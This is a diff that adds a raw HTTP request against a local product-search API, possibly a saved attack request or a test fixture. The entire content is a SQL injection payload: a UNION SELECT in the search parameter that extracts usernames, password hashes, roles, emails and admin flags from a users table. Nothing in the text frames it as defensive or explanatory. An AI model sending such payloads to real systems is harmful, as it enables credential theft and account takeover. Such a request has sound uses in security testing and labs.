@@ -1,0 +1,4 @@
+GET /api/v1/products/search?q='%20UNION%20SELECT%20id,%20username,%20password_hash,%20role,%20email,%20is_admin%20FROM%20users%20-- HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: application/json
